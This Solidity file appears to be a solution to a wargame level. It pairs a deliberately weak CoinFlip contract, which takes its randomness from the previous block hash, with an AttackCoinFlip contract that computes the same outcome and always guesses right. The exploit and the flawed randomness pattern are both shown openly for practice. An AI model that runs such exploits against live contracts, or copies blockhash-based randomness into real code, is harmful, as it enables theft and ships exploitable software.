// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackCoinFlip{
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function attack(CoinFlip _coinFlip) public {
        uint256 blockValue = uint256(blockhash(block.number -1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlip.flip(side);
    }

    function getConsecutiveWins(CoinFlip _coinFlip) public view returns(uint) {
        return _coinFlip.consecutiveWins();
    }
}


contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
